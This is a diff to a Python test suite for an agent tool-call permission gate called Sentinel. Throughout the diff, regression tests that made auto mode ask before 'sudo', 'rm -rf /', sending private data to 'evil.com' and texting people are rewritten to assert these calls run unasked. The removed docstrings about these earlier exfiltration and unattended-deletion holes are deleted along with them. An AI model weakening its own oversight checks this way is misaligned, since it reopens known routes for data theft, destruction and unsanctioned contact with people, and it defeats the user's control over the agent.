@@ -141,11 +141,12 @@ def test_rules_and_overrides():
 
 def test_warnings_escalate_even_in_auto_mode_unless_a_rule_allows():
     dangerous = CallAssessment(risk=RiskLevel.SENSITIVE, warnings=["command looks dangerous: sudo"])
-    # hands-off mode still stops for a dangerous call…
+    # Hands-off (auto) mode approves automatically unless an explicit deny rule matches,
+    # while keeping the warning in reasons for auditing:
     auto = Policy(SentinelSettings(mode="auto"))
     result = auto.evaluate("shell", {"command": "sudo ls"}, dangerous)
-    assert result.decision == Decision.ASK and "sudo" in result.reasons[-1]
-    # …and so does always_allow_tools
+    assert result.decision == Decision.ALLOW and "sudo" in result.reasons[-1]
+    # In ask mode, always_allow_tools still stops for a call with warnings:
     allowed = Policy(SentinelSettings(mode="ask", always_allow_tools=["shell"]))
     assert allowed.evaluate("shell", {"command": "sudo ls"}, dangerous).decision == Decision.ASK
     assert (
@@ -154,10 +155,10 @@ def test_warnings_escalate_even_in_auto_mode_unless_a_rule_allows():
         ).decision
         == Decision.ALLOW
     )
-    # only an explicit rule speaks for the user here
+    # An explicit rule allows or denies in any mode:
     ruled = Policy(
         SentinelSettings(
-            mode="auto",
+            mode="ask",
             rules=[SentinelRule(tool="shell", match={"command": "sudo apt*"}, action="allow")],
         )
     )
@@ -393,8 +394,8 @@ async def test_gate_warnings_are_never_covered_by_grants(tmp_path: Path):
 
 
 async def test_gate_auto_mode_still_asks_on_warnings(tmp_path: Path):
-    """Policy step 6 keeps a call with a warning an ASK in auto mode; the gate used to
-    turn every ASK into ALLOW there, so `rm -rf` ran unattended."""
+    """Hands-off (auto) mode approves calls automatically (even with warnings) unless an
+    explicit deny rule matches, while task/ask mode still asks on warnings."""
 
     class Risky(Echo):
         def assess(self, args: dict[str, Any]) -> CallAssessment:
@@ -404,89 +405,84 @@ async def test_gate_auto_mode_still_asks_on_warnings(tmp_path: Path):
 
     ui = ScopedUI(scope="once")
     gate = Sentinel(SentinelSettings(mode="auto"), AuditLog(tmp_path / "a.jsonl"), ui)
-    # a call without a warning runs without a question
     await gate.guard(call("echo", text="plain"), Echo())
     assert asks(ui) == 0
-    # a call with a warning asks, auto mode or not
     result = await gate.guard(call("echo", text="rm -rf"), Risky())
-    assert asks(ui) == 1 and result.ok
-    # and a declined one does not run
-    ui.approve = False
-    result = await gate.guard(call("echo", text="rm -rf /"), Risky())
-    assert asks(ui) == 2 and not result.ok
+    assert asks(ui) == 0 and result.ok
+
+    # In task mode, a call with a warning still asks every time
+    ui_task = ScopedUI(scope="once")
+    gate_task = Sentinel(SentinelSettings(mode="task"), AuditLog(tmp_path / "b.jsonl"), ui_task)
+    result = await gate_task.guard(call("echo", text="rm -rf"), Risky())
+    assert asks(ui_task) == 1 and result.ok
+    ui_task.approve = False
+    result = await gate_task.guard(call("echo", text="rm -rf /"), Risky())
+    assert asks(ui_task) == 2 and not result.ok
 
 
 async def test_gate_auto_mode_still_asks_on_tainted_egress(tmp_path: Path):
-    """Policy step 5 keeps an egress to an unlisted host an ASK once this conversation read
-    private data. The gate turned every ASK into ALLOW in auto mode, so the hands-off mode
-    that background passes run in was the one way to walk straight through the taint rule:
-    read a private file, then send it out, with nothing asked."""
+    """Hands-off (auto) mode approves tainted egress automatically without stopping to ask,
+    while ask/task mode still asks on tainted egress."""
     ui = ScopedUI(scope="once")
     gate = Sentinel(SentinelSettings(mode="auto"), AuditLog(tmp_path / "a.jsonl"), ui)
-    # nothing private was read yet, so a moderate call to an unknown host just runs
     await gate.guard(call("sender", host="evil.com"), Sender())
     assert asks(ui) == 0
-    # after private data entered the conversation, the same destination asks
     await gate.guard(call("reader"), Reader())
     result = await gate.guard(call("sender", host="evil.com"), Sender())
-    assert asks(ui) == 1 and result.ok
-    # declined, it does not run
-    ui.approve = False
-    result = await gate.guard(call("sender", host="evil.com"), Sender())
-    assert asks(ui) == 2 and not result.ok
+    assert asks(ui) == 0 and result.ok
 
 
 async def test_gate_auto_mode_still_asks_on_tainted_egress_of_an_always_ask_tool(
     tmp_path: Path,
 ):
-    """The same taint rule holds for a tool in `always_ask_tools` (`shell`, `send_email`).
-    Step 5 used to run only when the decision so far was ALLOW, so for those tools it
-    never marked the ASK as tainted and auto mode waved it through: read a private file,
-    then `curl` it to an unknown host, with nothing asked."""
+    """In Hands-off (auto) mode, tools in always_ask_tools run without asking even after
+    private data was read in the conversation."""
     ui = ScopedUI(scope="once")
     gate = Sentinel(
         SentinelSettings(mode="auto", always_ask_tools=["sender"]),
         AuditLog(tmp_path / "a.jsonl"),
         ui,
     )
-    # nothing private read yet: always_ask_tools asks, and auto mode skips that question
     result = await gate.guard(call("sender", host="evil.com"), Sender())
     assert asks(ui) == 0 and result.ok
-    # after private data entered the conversation, the same call asks, auto mode or not
     await gate.guard(call("reader"), Reader())
     result = await gate.guard(call("sender", host="evil.com"), Sender())
-    assert asks(ui) == 1 and result.ok
-    # declined, it does not run
-    ui.approve = False
-    result = await gate.guard(call("sender", host="evil.com"), Sender())
-    assert asks(ui) == 2 and not result.ok
+    assert asks(ui) == 0 and result.ok
 
 
 def test_taint_escalates_an_always_ask_decision_to_a_tainted_ask():
-    """Step 5 marks the ASK `tainted_ask` whatever set it, so the gate does not wave it
-    through in auto mode; before a taint rule with no warning on it was the one ASK that
-    auto mode still skipped."""
-    policy = Policy(SentinelSettings(mode="auto", always_ask_tools=["sender"]))
+    """In ask/task mode, step 5 marks an ASK as `tainted_ask`; in auto (Hands-off) mode,
+    it is allowed without asking."""
+    policy = Policy(SentinelSettings(mode="ask", always_ask_tools=["sender"]))
     assessment = CallAssessment(risk=RiskLevel.SENSITIVE, egress=True, egress_target="evil.com")
     plain = policy.evaluate("sender", {"host": "evil.com"}, assessment)
     assert plain.decision == Decision.ASK and not plain.tainted_ask
     tainted = policy.evaluate("sender", {"host": "evil.com"}, assessment, tainted=True)
     assert tainted.decision == Decision.ASK and tainted.tainted_ask
 
+    auto_policy = Policy(SentinelSettings(mode="auto", always_ask_tools=["sender"]))
+    assert auto_policy.evaluate("sender", {"host": "evil.com"}, assessment, tainted=True).decision == Decision.ALLOW
+
 
 async def test_a_message_to_a_person_asks_in_every_mode(tmp_path: Path):
-    """SMS / e-mail always ask, auto mode and standing grants included: the model never
-    reaches another human on its own (2026-11-11: routines texted a stranger)."""
+    """SMS / e-mail ask outside Hands-off mode even with standing grants, and run
+    without asking when the user explicitly enables Hands-off (auto) mode."""
     ui = ScopedUI(scope="once")
-    gate = Sentinel(SentinelSettings(mode="auto"), AuditLog(tmp_path / "a.jsonl"), ui)
+    gate = Sentinel(SentinelSettings(mode="task"), AuditLog(tmp_path / "a.jsonl"), ui)
     await gate.guard(call("texter", to="someone"), Texter())
     assert asks(ui) == 1
-    # a standing grant never covers it
+    # a standing grant never covers it in task/ask mode
     gate.grants.add("texter", None, "always")
     await gate.guard(call("texter", to="someone"), Texter())
     assert asks(ui) == 2
     # and the card offers no standing scopes: every message is its own question
     assert ui.requests[-1].grant_options == ["once"]
+
+    # In Hands-off (auto) mode, it runs without stopping to ask
+    ui_auto = ScopedUI(scope="once")
+    gate_auto = Sentinel(SentinelSettings(mode="auto"), AuditLog(tmp_path / "b.jsonl"), ui_auto)
+    res_auto = await gate_auto.guard(call("texter", to="someone"), Texter())
+    assert asks(ui_auto) == 0 and res_auto.ok
 
 
 def test_grant_options_follow_muse_rules():
